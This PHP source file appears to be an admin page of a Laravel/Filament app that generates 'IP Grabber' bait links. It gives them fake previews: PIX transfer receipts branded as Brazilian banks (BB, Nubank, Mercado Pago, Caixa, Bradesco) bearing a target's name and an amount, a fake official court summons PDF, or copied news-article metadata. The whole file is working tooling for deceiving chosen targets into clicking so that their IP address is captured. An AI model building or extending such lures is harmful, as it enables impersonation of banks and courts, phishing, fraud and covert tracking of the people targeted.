<?php

namespace App\Filament\Resources\PixelTracks\Pages;

use App\Filament\Resources\PixelTracks\IpGrabberResource;
use App\Models\IpGrabber;
use App\Services\Pixel\IntimacaoPreviewService;
use App\Services\Pixel\NewsPreviewMetadataService;
use App\Services\Pixel\PixBBImagemService;
use App\Services\Pixel\PixCaixaImagemService;
use App\Services\Pixel\PixImagemService;
use App\Services\Pixel\PixMercadoPagoImagemService;
use App\Services\Pixel\PixNubankImagemService;
use Filament\Notifications\Notification;
use Filament\Resources\Pages\CreateRecord;
use Illuminate\Support\Facades\Log;
use Illuminate\Support\Facades\Storage;
use Illuminate\Support\Str;

class CreateIpGrabber extends CreateRecord
{
    protected static string $resource = IpGrabberResource::class;

    protected static ?string $title = 'Gerar IP Grabber';

    /** @var array<string, mixed>|null Campos OG gerados automaticamente, reaplicados em afterCreate() */
    private ?array $ogGerado = null;

    protected function getCreateFormAction(): \Filament\Actions\Action
    {
        return parent::getCreateFormAction()->label('Gerar isca');
    }

    /**
     * O botão de criação fica no último passo do Wizard.
     *
     * @return array<\Filament\Actions\Action>
     */
    protected function getFormActions(): array
    {
        return [];
    }

    protected function getCreateAnotherFormAction(): \Filament\Actions\Action
    {
        return parent::getCreateAnotherFormAction()->hidden();
    }

    protected function mutateFormDataBeforeCreate(array $data): array
    {
        $data['token'] = Str::random(40);
        $data['created_by'] = auth()->id();
        $data['tracking_channel'] = 'link';
        unset($data['tipo_link'], $data['pix_modelo'], $data['capture_ip_porta']);

        if (($data['preview_tipo'] ?? null) !== 'mensagem') {
            $data['tracking_domain'] = null;
        }

        // Limpa redirect_url se mensagem não for redirecionamento, ou se for tipo que não suporta
        if (
            ($data['mensagem'] ?? null) !== 'Redirecionar para página'
            || in_array($data['preview_tipo'] ?? null, ['noticia', 'intimacao'], true)
        ) {
            $data['redirect_url'] = null;
        }

        $usaUpload = (bool) ($data['preview_usar_upload'] ?? false);
        $usaUrl = (bool) ($data['preview_usar_url'] ?? false);
        unset(
            $data['preview_usar_upload'],
            $data['preview_usar_url'],
        );

        // Gera imagem PIX com nome do alvo + data/hora se o campo foi preenchido
        $nomeAlvo = trim((string) ($data['nome_alvo'] ?? ''));
        unset($data['nome_alvo']); // campo virtual — não persiste no banco

        if (($data['preview_tipo'] ?? null) === 'mensagem') {
            if (! $usaUpload) {
                $data['og_imagem_upload'] = null;
            }

            if (! $usaUrl) {
                $data['og_imagem'] = null;
            }
        }

        if (($data['preview_tipo'] ?? null) === 'pix_nome_alvo' && $nomeAlvo !== '') {
            try {
                $pathGerado = app(PixImagemService::class)->gerar($nomeAlvo, $data['token']);
            } catch (\Throwable $e) {
                Log::warning('PixImagemService::gerar falhou: ' . $e->getMessage());
                $pathGerado = null;
            }

            if ($pathGerado) {
                $this->ogGerado = [
                    'og_titulo'        => 'Comprovante PIX',
                    'og_descricao'     => 'Clique para abrir seu comprovante.',
                    'og_imagem_upload' => $pathGerado,
                    'og_imagem'        => null,
                ];
                $data = array_merge($data, $this->ogGerado);
            }
        }

        if (($data['preview_tipo'] ?? null) === 'pix_bb') {
            $pixBbValor = trim((string) ($data['pix_bb_valor'] ?? ''));
            unset($data['pix_bb_valor']);

            $this->ogGerado = [
                'og_titulo'    => 'Comprovante BB',
                'og_descricao' => 'Clique para abrir seu comprovante.',
            ];

            if ($nomeAlvo !== '' && $pixBbValor !== '') {
                try {
                    $pathGerado = app(PixBBImagemService::class)->gerar($nomeAlvo, $pixBbValor, $data['token']);
                } catch (\Throwable $e) {
                    Log::warning('PixBBImagemService::gerar falhou: ' . $e->getMessage());
                    $pathGerado = null;
                }

                if ($pathGerado) {
                    $this->ogGerado['og_imagem_upload'] = $pathGerado;
                    $this->ogGerado['og_imagem']        = null;
                }
            }

            $data = array_merge($data, $this->ogGerado);
        }

        if (($data['preview_tipo'] ?? null) === 'pix_nubank') {
            $pixNubankValor = trim((string) ($data['pix_nubank_valor'] ?? ''));
            unset($data['pix_nubank_valor']);

            $this->ogGerado = [
                'og_titulo'    => 'Comprovante de transferência',
                'og_descricao' => 'Clique para abrir seu comprovante.',
            ];

            if ($pixNubankValor !== '') {
                try {
                    $pathGerado = app(PixNubankImagemService::class)->gerar($pixNubankValor, $data['token']);
                } catch (\Throwable $e) {
                    Log::warning('PixNubankImagemService::gerar falhou: ' . $e->getMessage());
                    $pathGerado = null;
                }

                if ($pathGerado) {
                    $this->ogGerado['og_imagem_upload'] = $pathGerado;
                    $this->ogGerado['og_imagem']        = null;
                }
            }

            $data = array_merge($data, $this->ogGerado);
        }

        if (($data['preview_tipo'] ?? null) === 'pix_mercadopago') {
            $pixMpValor = trim((string) ($data['pix_mp_valor'] ?? ''));
            unset($data['pix_mp_valor']);

            $this->ogGerado = [
                'og_titulo'    => 'Comprovante de Pix',
                'og_descricao' => 'Clique para abrir seu comprovante.',
            ];

            if ($nomeAlvo !== '' && $pixMpValor !== '') {
                try {
                    $pathGerado = app(PixMercadoPagoImagemService::class)->gerar($nomeAlvo, $pixMpValor, $data['token']);
                } catch (\Throwable $e) {
                    Log::warning('PixMercadoPagoImagemService::gerar falhou: ' . $e->getMessage());
                    $pathGerado = null;
                }

                if ($pathGerado) {
                    $this->ogGerado['og_imagem_upload'] = $pathGerado;
                    $this->ogGerado['og_imagem']        = null;
                }
            }

            $data = array_merge($data, $this->ogGerado);
        }

        if (($data['preview_tipo'] ?? null) === 'intimacao') {
            $this->ogGerado = [
                'mensagem'     => 'Aceite e aguarde o download da intimação',
                'og_titulo'    => 'Intimação.pdf',
                'og_descricao' => 'Clique para visualizar e baixar o documento oficial.',
            ];

            if (filled($data['intimacao_arquivo'] ?? null)) {
                try {
                    $preview = app(IntimacaoPreviewService::class)->gerarPreview((string) $data['intimacao_arquivo'], $data['token']);
                } catch (\Throwable $e) {
                    Log::warning('IntimacaoPreviewService::gerarPreview falhou: ' . $e->getMessage());
                    $preview = null;
                }

                if ($preview) {
                    $this->ogGerado['og_imagem_upload'] = $preview;
                    $this->ogGerado['og_imagem']        = null;
                }
            }

            $data = array_merge($data, $this->ogGerado);
        }

        if (($data['preview_tipo'] ?? null) === 'pix_caixa') {
            $valor = trim((string) ($data['pix_caixa_valor'] ?? ''));
            unset($data['pix_caixa_valor']);

            $this->ogGerado = [
                'og_titulo'   => 'Comprovante PIX Caixa',
                'og_descricao' => 'Clique para abrir seu comprovante.',
            ];

            if ($valor !== '') {
                try {
                    $pathGerado = app(PixCaixaImagemService::class)->gerar($valor, $data['token']);
                } catch (\Throwable $e) {
                    Log::warning('PixCaixaImagemService::gerar falhou: ' . $e->getMessage());
                    $pathGerado = null;
                }

                if ($pathGerado) {
                    $this->ogGerado['og_imagem_upload'] = $pathGerado;
                    $this->ogGerado['og_imagem']        = null;
                }
            }

            $data = array_merge($data, $this->ogGerado);
        }

        if (($data['preview_tipo'] ?? null) === 'pix_bradesco') {
            $data['og_titulo'] = 'Comprovante PIX Bradesco';
            $data['og_descricao'] = 'Confirme sua chave pix clicando aqui.';
            $this->fillPixTemplateImage($data);
        }

        if (($data['preview_tipo'] ?? null) === 'noticia' && filled($data['noticia_url'] ?? null)) {
            $metadata = app(NewsPreviewMetadataService::class)->fetch((string) $data['noticia_url']);
            $data['og_titulo'] = filled($data['og_titulo'] ?? null) ? $data['og_titulo'] : ($metadata['og_titulo'] ?? null);
            $data['og_descricao'] = filled($data['og_descricao'] ?? null) ? $data['og_descricao'] : ($metadata['og_descricao'] ?? null);
            $data['og_imagem'] = filled($data['og_imagem'] ?? null) ? $data['og_imagem'] : ($metadata['og_imagem'] ?? null);

            if (empty($data['og_imagem_upload']) && filled($metadata['og_imagem'] ?? null)) {
                $data['og_imagem_upload'] = app(NewsPreviewMetadataService::class)
                    ->storeImage((string) $metadata['og_imagem'], (string) $data['token']);
            }

            $data['mensagem'] = 'Abrindo notícia, aguarde...';
        }

        return $data;
    }

    protected function afterCreate(): void
    {
        /** @var IpGrabber $ipGrabber */
        $ipGrabber = $this->record;

        // Reaplica campos OG gerados — o saveRelationships() do Filament pode sobrescrever
        // og_imagem_upload com null porque o FileUpload na seção oculta não tem arquivo.
        if ($this->ogGerado) {
            $ipGrabber->forceFill($this->ogGerado)->save();
        }

        $url = $ipGrabber->trackingUrl();
        $previewUrl = $ipGrabber->trackingUrlWithQuery(['preview' => 1]);

        Notification::make()
            ->title('IP Grabber criado com sucesso!')
            ->body("URL real: {$url}\nURL de teste sem captura: {$previewUrl}")
            ->success()
            ->persistent()
            ->send();
    }

    protected function getRedirectUrl(): string
    {
        return $this->getResource()::getUrl('index');
    }

    protected function getCreatedNotification(): ?Notification
    {
        return null;
    }

    private function fillPixTemplateImage(array &$data): void
    {
        foreach (['png', 'jpg', 'jpeg'] as $extension) {
            $template = "pixel-og/templates/pix-bradesco.{$extension}";

            if (! Storage::disk('public')->exists($template)) {
                continue;
            }

            $dest = 'pixel-og/' . $data['token'] . "-bradesco.{$extension}";
            Storage::disk('public')->copy($template, $dest);
            $data['og_imagem_upload'] = $dest;

            return;
        }
    }
}
